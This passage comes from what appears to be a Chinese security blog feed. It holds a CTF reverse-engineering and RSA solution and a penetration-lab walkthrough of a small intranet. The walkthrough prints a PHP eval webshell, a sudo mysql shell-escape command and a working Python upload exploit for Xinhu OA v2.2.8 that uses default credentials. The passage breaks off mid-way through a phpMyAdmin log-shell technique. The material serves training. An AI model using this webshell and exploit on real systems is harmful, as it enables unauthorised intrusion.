class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br></pre></td><td class="code"><pre><code class="hljs text">97704D -= 120;<br>977070 ^= 0x4Fu;<br>977055 -= 30;<br>977064 -= 93;<br>977048 += 95;<br>97704A += 103;<br>97705C ^= 0x82u;<br>977069 += 52;<br>97705E ^= 3u;<br>977041 += 71;<br>977076 ^= 0xE0u;<br>97706D -= 44;<br>977044 -= 127;<br>977075 -= 71;<br>977060 ^= 0xAAu;<br>97704E -= 119;<br>977062 ^= 0xAu;<br>97707D -= 48;<br>977075 += 55;<br>97705B += 111;<br>97706E ^= 0x32u;<br>97706C -= 92;<br>97705F ^= 0x29u;<br>977041 += 79;<br>97704A += 58;<br>977062 -= 17;<br>97705A += 123;<br>977075 -= 100;<br>97705C -= 64;<br>977056 -= 89;<br>977070 ^= 0x73u;<br>977062 ^= 0x61u;<br>97706E += 118;<br>977062 += 41;<br>977070 += 78;<br>977055 -= 11;<br>97704F ^= 0x5Eu;<br>977070 ^= 0xB2u;<br>977066 -= 66;<br>977046 ^= 0xECu;<br>977062 ^= 0xD1u;<br>977046 -= 99;<br>977069 -= 49;<br>977046 += 32;<br>977066 += 61;<br>977042 ^= 0x42u;<br>977055 += 109;<br>977070 += 14;<br>97707B -= 52;<br>97706E -= 94;<br>977074 += 57;<br>97705D -= 30;<br>97705E -= 107;<br>977048 += 55;<br>97704C -= 27;<br>97706F -= 88;<br>97707A -= 105;<br>977040 += 25;<br>97704C += 73;<br>97706F -= 80;<br>977070 += 125;<br>97706E -= 44;<br>97707A += 11;<br>977068 ^= 0x57u;<br>977062 += 117;<br>977056 += 92;<br>97705B ^= 0x7Au;<br>977043 += 33;<br>977045 ^= 0xC3u;<br>97705E += 19;<br>977064 -= 46;<br>977065 -= 45;<br>977067 ^= 0xB0u;<br>97704F -= 69;<br>977061 ^= 0xDCu;<br>977046 += 69;<br>97707E += 116;<br>97704B ^= 0x22u;<br>977063 ^= 0x7Eu;<br>977054 += 18;<br>977072 -= 11;<br>97704E ^= 5u;<br>97706E += 58;<br>977048 += 44;<br>97706D ^= 0xE4u;<br>977068 -= 30;<br>977063 += 96;<br>977047 -= 49;<br>977062 += 83;<br>97707A += 53;<br>97706A ^= 0x21u;<br>97707C += 49;<br>97705B += 11;<br>977070 -= 105;<br>977063 -= 47;<br>977073 -= 67;<br>977047 += 94;<br>97707E += 78;<br>97704F -= 96;<br>97707A ^= 0xD3u;<br>977043 += 115;<br>97705E -= 127;<br>97707A -= 86;<br>977074 += 32;<br>977067 ^= 0x5Cu;<br>977049 -= 64;<br>97706B ^= 0x8Eu;<br>97707E += 121;<br>977054 -= 98;<br>977074 ^= 0x22u;<br>97704F -= 12;<br>977045 ^= 0x2Du;<br>97707C -= 44;<br>97704D -= 74;<br>977061 ^= 0x82u;<br>977068 ^= 0xEDu;<br>977071 ^= 0xBEu;<br>977077 += 4;<br>97705E -= 120;<br>97704B += 67;<br>977072 -= 52;<br>977042 ^= 0x87u;<br>977067 -= 38;<br>97707B ^= 0xFAu;<br>977072 += 90;<br>97706E -= 9;<br>977077 ^= 0x2Fu;<br>977049 += 83;<br>97706B ^= 0xD6u;<br>977062 -= 6;<br>977048 -= 119;<br>977061 -= 118;<br>977062 -= 75;<br>977068 -= 52;<br>977040 -= 108;<br>97706A += 28;<br>97707C ^= 0x4Cu;<br>97706C ^= 0x4Au;<br>977061 ^= 0xFDu;<br>977063 += 125;<br>977041 ^= 0x6Cu;<br>977075 += 25;<br>977071 -= 7;<br>97707D -= 119;<br>97706F -= 16;<br>977064 += 53;<br>977066 ^= 0x56u;<br>977042 ^= 0xF2u;<br>97706B += 115;<br>977055 -= 37;<br>977072 -= 51;<br>977041 -= 107;<br>97704F -= 116;<br>97705C += 46;<br>977065 -= 67;<br>97704C += 113;<br>977061 += 114;<br>97704E += 69;<br>977060 += 99;<br>977064 ^= 0x88u;<br>977079 -= 37;<br>97705E ^= 0x76u;<br>977070 += 95;<br>97707A += 51;<br>977074 ^= 0xD3u;<br>97704F -= 86;<br>977040 -= 6;<br>97707C -= 8;<br>977071 ^= 0x30u;<br>97705B += 29;<br>977070 += 65;<br>97705D ^= 0xEEu;<br>977047 -= 31;<br>977061 -= 16;<br>977071 += 9;<br>977064 -= 46;<br>977049 ^= 0xDEu;<br>977054 ^= 0x6Du;<br>977065 -= 91;<br>977077 += 119;<br>97707D -= 8;<br>--977061;<br>977075 += 124;<br>977068 += 3;<br>977059 -= 22;<br>977060 ^= 0xD3u;<br>977072 ^= 0xA4u;<br>977040 ^= 0xA8u;<br>97707F += 50;<br>97707E ^= 0x4Du;<br>977070 += 60;<br>97704B += 49;<br>97707B += 3;<br>97706A -= 20;<br>977060 -= 38;<br>977063 -= 2;<br>97707B -= 108;<br>97707E -= 71;<br>97706E += 111;<br>977040 ^= 0xD9u;<br>97704E += 76;<br>97706F ^= 0xF6u;<br>97705B += 26;<br>977040 -= 27;<br>977060 -= 80;<br>977078 -= 27;<br>97705B += 7;<br>++977073;<br>977075 ^= 0xDDu;<br>977043 -= 127;<br>977072 += 116;<br>977069 -= 70;<br>977065 ^= 0x9Bu;<br>977059 -= 34;<br>97704B -= 127;<br>97707F ^= 0xBu;<br>977058 -= 65;<br>97704B ^= 0x83u;<br>977059 ^= 0xB6u;<br>977067 -= 25;<br>977042 -= 94;<br>977061 ^= 0x7Eu;<br>977072 -= 69;<br>977077 -= 72;<br>977060 ^= 0xF7u;<br>977043 -= 11;<br>977069 ^= 0x64u;<br>977075 ^= 0xEu;<br>977073 -= 111;<br>977065 ^= 0x7Au;<br>97706B -= 7;<br>977060 += 103;<br>97707D ^= 0xF4u;<br>977077 += 16;<br>97705C ^= 0x89u;<br>977041 -= 20;<br>97707A ^= 0x3Fu;<br>97704D -= 31;<br>977073 += 98;<br>977073 -= 5;<br>977061 -= 30;<br>97704C += 73;<br>977054 -= 6;<br>977071 ^= 0x56u;<br>97705B ^= 3u;<br>977055 -= 119;<br>97706D += 37;<br>97705E += 4;<br>977044 -= 48;<br>977076 ^= 0xF4u;<br>977053 ^= 0x10u;<br>977059 ^= 0x47u;<br>977060 ^= 0xE2u;<br>97704E -= 16;<br>97705E ^= 0xD2u;<br>977042 += 70;<br>977060 -= 91;<br>977041 ^= 0x12u;<br>977042 -= 81;<br>977047 += 92;<br>977055 -= 77;<br>97705D ^= 0x7Du;<br>977070 ^= 0x4Au;<br>977074 -= 25;<br>977074 -= 127;<br>97704B += 121;<br>97706C += 64;<br>97707A ^= 0x58u;<br>97704B -= 123;<br>977078 += 42;<br>977071 -= 89;<br>97707E ^= 0x99u;<br>977043 -= 6;<br>977045 ^= 0x7Du;<br>977042 -= 14;<br>977064 += 96;<br>977058 += 26;<br>97706E += 54;<br>977052 -= 86;<br>97705D ^= 0x4Eu;<br>977055 -= 15;<br>977078 -= 32;<br>977057 += 75;<br>97706E += 66;<br>977053 += 101;<br>97705E -= 59;<br>97706B ^= 0xFAu;<br>977042 += 93;<br>977073 -= 123;<br>97707C += 31;<br>977064 ^= 0xA2u;<br>977073 -= 32;<br>97705A ^= 0x11u;<br>97707D += 121;<br>977074 -= 99;<br>977054 ^= 0x68u;<br>97706D -= 75;<br>977041 -= 117;<br>977043 += 92;<br>977041 += 88;<br>97704D -= 4;<br>977052 ^= 0x43u;<br>97704B += 8;<br>97706A -= 82;<br>977055 += 56;<br>977049 += 43;<br>977075 ^= 0xD1u;<br>97705D ^= 0x1Bu;<br>977052 -= 74;<br>97707B -= 104;<br>977073 -= 6;<br>977053 -= 120;<br>977043 -= 6;<br>977069 -= 2;<br>97705E ^= 0xFEu;<br>97707E ^= 0x45u;<br>977052 += 5;<br>977068 ^= 0x36u;<br>977051 -= 42;<br>977050 ^= 0xD6u;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python">d=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>).read().splitlines()<br>data=[ <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xD3</span>, <br>  <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x60</span>, <br>  <span class="hljs-number">0x17</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x8E</span>, <br>  <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x52</span>]<br>e=&#123;&#125;<br>base=<span class="hljs-number">0x977040</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_int</span>(<span class="hljs-params">s</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0x&#x27;</span> <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>  i=i.strip().strip(<span class="hljs-string">&#x27;;&#x27;</span>)<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">in</span> i:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;--&#x27;</span> <span class="hljs-keyword">in</span> i):<br>      value=<span class="hljs-number">1</span><br>      addr=<span class="hljs-built_in">int</span>(i.strip(<span class="hljs-string">&#x27;-&#x27;</span>),<span class="hljs-number">16</span>)-base<br>    <span class="hljs-keyword">else</span>:<br>      value=parse_int(i.split(<span class="hljs-string">&#x27;-=&#x27;</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">&#x27;;u&#x27;</span>))<br>      addr=<span class="hljs-built_in">int</span>(i.split()[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)-base<br>    state=<span class="hljs-number">0</span><br>  <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;^&#x27;</span> <span class="hljs-keyword">in</span> i:<br>    value=parse_int(i.split(<span class="hljs-string">&#x27;^=&#x27;</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">&#x27;;u&#x27;</span>))<br>    addr=<span class="hljs-built_in">int</span>(i.split()[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)-base<br>    state=<span class="hljs-number">1</span><br>  <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">in</span> i:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;++&#x27;</span> <span class="hljs-keyword">in</span> i):<br>      value=<span class="hljs-number">1</span><br>      addr=<span class="hljs-built_in">int</span>(i.strip(<span class="hljs-string">&#x27;+&#x27;</span>),<span class="hljs-number">16</span>)-base<br>    <span class="hljs-keyword">else</span>:<br>      value=parse_int(i.split(<span class="hljs-string">&#x27;+=&#x27;</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">&#x27;;u&#x27;</span>))<br>      addr=<span class="hljs-built_in">int</span>(i.split()[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)-base<br>    state=<span class="hljs-number">2</span><br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">continue</span><br>  <span class="hljs-keyword">if</span> (e.get(addr)==<span class="hljs-literal">None</span>):<br>    e[addr]=[]<br>  e[addr].append((state,value))<br><br><span class="hljs-built_in">print</span>(e[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>  <span class="hljs-keyword">if</span> i&gt;=<span class="hljs-built_in">len</span>(data):<br>    <span class="hljs-keyword">continue</span><br>  <span class="hljs-keyword">for</span> state,value <span class="hljs-keyword">in</span> e[i][::-<span class="hljs-number">1</span>]:<br>    <span class="hljs-comment"># print(state,value)</span><br>    <span class="hljs-keyword">if</span> state==<span class="hljs-number">0</span>:<br>      data[i]+=value<br>    <span class="hljs-keyword">elif</span> state==<span class="hljs-number">1</span>:<br>      data[i]^=value<br>    <span class="hljs-keyword">elif</span> state==<span class="hljs-number">2</span>:<br>      data[i]-=value<br>    data[i]=data[i]&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(data))<br></code></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Three-prime-RSA"><a href="#Three-prime-RSA" class="headerlink" title="Three-prime RSA"></a>Three-prime RSA</h2><p>从 r_cubed 恢复 r</p><p><code>r = int(round(r_cubed ** (1/3)))</code></p><p>从 D 中恢复 (p+q+r) 和 random_num<br> 题目中 <code>random_num</code> 是一个 28 位质数，<code>p+q+r</code> 大约 512~514 位。因为 <code>(p+q+r)*random_num &lt; n</code>，所以 <code>D</code> 没有取模的影响：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random_num = <span class="hljs-number">254766409</span>  <span class="hljs-comment"># 可通过简单分解D得到</span><br>s = D // random_num     <span class="hljs-comment"># 得到 s = p + q + r</span><br></code></pre></td></tr></table></figure><p>求p+q</p><p><code>p_plus_q = s - r</code></p><p>解一元二次方程得到 p 和 q<br> 方程：<code>x^2 - (p+q)x + p*q = 0</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, solve<br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>sols = solve(x**<span class="hljs-number">2</span> - p_plus_q*x + pq, x)<br>p, q = <span class="hljs-built_in">int</span>(sols[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(sols[<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p>计算 d 并解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br>e = <span class="hljs-number">65537</span><br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;5521a971-9bed-11ef-bfda-14ac6024b6a8&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;吾的字节-1&quot;&gt;&lt;a href=&quot;#吾的字节-1&quot; class=&quot;headerlink&quot; title=&quot;吾的字节_</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="宁波" scheme="https://www.dr0n.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
    <category term="2025竞赛" scheme="https://www.dr0n.top/tags/2025%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透学习(域横向移动篇)</title>
    <link href="https://www.dr0n.top/posts/dcf6516b/"/>
    <id>https://www.dr0n.top/posts/dcf6516b/</id>
    <published>2025-08-16T04:00:00.000Z</published>
    <updated>2025-08-28T07:45:58.563Z</updated>
    
    <content type="html"><![CDATA[<p>目录结构参考的是<a href="https://www.thehacker.recipes/">The Hacker Recipes</a><br>因为内容太多就分几篇来总结了</p><hr><h2 id="域渗透学习-Credentials篇"><a href="#域渗透学习-Credentials篇" class="headerlink" title="域渗透学习(Credentials篇)"></a><a href="/posts/e0ff8995/">域渗透学习(Credentials篇)</a></h2><h2 id="域渗透学习-NTLM篇"><a href="#域渗透学习-NTLM篇" class="headerlink" title="域渗透学习(NTLM篇)"></a><a href="/posts/3f5b8fbe/">域渗透学习(NTLM篇)</a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目录结构参考的是&lt;a href=&quot;https://www.thehacker.recipes/&quot;&gt;The Hacker Recipes&lt;/a&gt;&lt;br&gt;因为内容太多就分几篇来总结了&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;域渗透学习-Credentials篇&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域" scheme="https://www.dr0n.top/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>春秋云境 Initial</title>
    <link href="https://www.dr0n.top/posts/5a3650d1/"/>
    <id>https://www.dr0n.top/posts/5a3650d1/</id>
    <published>2025-07-14T08:00:00.000Z</published>
    <updated>2025-08-28T11:40:49.914Z</updated>
    
    <content type="html"><![CDATA[<p>开始签到白嫖打完所有靶机计划!</p><blockquote><p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p></blockquote><p>前置知识:</p><p><a href="/posts/52375b43/">内网渗透学习(代理篇)</a><br><a href="/posts/e0ff8995/">域渗透学习(Credentials篇)</a><br><a href="/posts/3f5b8fbe/">域渗透学习(NTLM篇)</a><br><a href="/posts/fcb3a8d7/">linux提权笔记</a></p><h1 id="入口（172-22-1-15）"><a href="#入口（172-22-1-15）" class="headerlink" title="入口（172.22.1.15）"></a>入口（172.22.1.15）</h1><p>根据报错信息得知是ThinkPHP 5，存在nday，可以getshell</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-1.png"></p><p>写马后查看用户是 www-data 尝试sudo提权</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-3.png"></p><p>发现mysql有权限，在gtfobins查询得到命令<code>sudo mysql -e &#39;\! /bin/sh&#39;</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-4.png"></p><p>得到flag1：<code>flag01: flag&#123;60b53231-</code></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>查看入口主机IP是 172.22.1.15</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-2.png"></p><p>上传fscan扫C段</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-5.png"></p><p>一共三台主机，信呼OA，存在ms17-010的windows和一台DC域控</p><p>上传iox构建socks代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 6666<br></code></pre></td></tr></table></figure><h2 id="信呼OA（172-22-1-18）"><a href="#信呼OA（172-22-1-18）" class="headerlink" title="信呼OA（172.22.1.18）"></a>信呼OA（172.22.1.18）</h2><p>存在弱口令使用<code>admin/admin123</code>登录</p><p>版本是v2.2.8，有<a href="https://blog.csdn.net/solitudi/article/details/118675321">文件上传漏洞</a></p><p>先在脚本同目录放一个1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp，注意几个传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>session = requests.session()<br><br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br><br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">print</span>(filepath)<br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br><br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>成功上传shell</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-7.png"></p><p>得到flag2：<code>flag02: 2ce3-4813-87d4-</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-8.png"></p><hr><p>另一种打法</p><p>这台机子还部署了phpmyadmin</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-6.png"></p><p>恰好<code>root/root</code>弱口令可以登录</p><p>查看目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-9.png"></p><p>查看是否开启日志以及存放的日志位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-10.png"></p><p>开启日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span 